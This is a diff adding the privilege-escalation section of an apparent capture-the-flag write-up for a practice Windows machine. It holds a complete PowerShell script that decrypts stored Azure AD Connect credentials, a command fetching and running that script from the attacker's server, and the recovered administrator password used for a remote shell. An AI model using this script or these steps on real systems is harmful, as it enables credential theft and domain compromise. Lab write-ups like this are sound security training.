@@ -120,7 +120,7 @@ index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope
     Name: Mike Hope
     Desc: (null)
 index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary
-    Name: Ray O'Leary
+    Name: Ray OLeary
     Desc: (null)
 index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs
     Name: SABatchJobs
@@ -458,4 +458,100 @@ Mode                LastWriteTime         Length Name
 
 *Evil-WinRM* PS C:\Users\mhope\Desktop> more user.txt
 4961976bd7d8f4exxxxxxxxxxxxxxxx
+{% endhighlight %}
+
+Now that I have owned user, time to move onto root. I used <a href="https://github.com/411Hall/JAWS" target="_blank">Just Another Windows (Enum) Script</a>, also known as JAWS. This is another go-to tool for CTF style machines, to quickly identify escelation paths. When I ran the script on Monteverde, I found in part of the output, that there were some interesting recently modified files:
+
+{% highlight bash linenos %}
+-----------------------------------------------------------
+ 10 Last Modified Files in C:\User
+-----------------------------------------------------------
+C:\Users\mhope\.Azure\AzurePSDataCollectionProfile.json
+C:\Users\mhope\.Azure
+C:\Users\mhope\.Azure\ErrorRecords
+C:\Users\mhope\.Azure\ErrorRecords\New-AzADServicePrincipal_2020-01-03-T05-35-17-334.log
+C:\Users\mhope\.Azure\AzureRmContext.json
+C:\Users\mhope\.Azure\TokenCache.dat
+C:\Users\mhope\Desktop
+C:\Users\mhope\Desktop\user.txt
+C:\Users\mhope\Documents
+C:\Users\mhope\Documents\jaws.ps1
+{% endhighlight %}
+
+The fact that there were Azure files in the home directory had me begin looking at what was installed on the box. Looking in the "C:\Program Files (x86)" directory, there is the Azure AD Sync tool installed. Looking at this as a possible privilege escalation path, I did some Google-Fu and discovered this article to better understand the tool: <a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/" target="_blank">https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/</a>.
+
+Furthering my invrstigation, I then found a POC of a way to decrypt the username and password for this tool, very cool! The script can be found at <a href="https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545" target="_blank">https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545</a>. However, there was some tweaking that needed to be done to the script for it to run:
+
+{% highlight bash linenos %}
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=.;Initial Catalog=ADSync;trusted_connection=true;"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
+
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+{% endhighlight %}
+
+And with my script ready, I had to transfer it to Monteverde. In the directory that the azure_decrypt_msol.ps1 script was located in, I spun up a quick python web server. Once hosted, on Monteverde I downloaded the file with PowerShell, and ran the script:
+
+{% highlight bash linenos %}
+*Evil-WinRM* PS C:\Users\mhope\Documents> invoke-webrequest -uri http://10.10.14.13/azure_decrypt_msol.ps1 -outfile azureread_cred.ps1
+*Evil-WinRM* PS C:\Users\mhope\Documents> ./azureread_cred.ps1
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+{% endhighlight %}
+
+And finally, now that I had administrator credentials, I logged in with Evil-WinRM and rooted monteverde!
+
+{% highlight bash linenos %}
+evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
+
+Evil-WinRM shell v2.1
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         1/3/2020   5:48 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
+12909612d25c8xxxxxxxxxxxx
 {% endhighlight %}
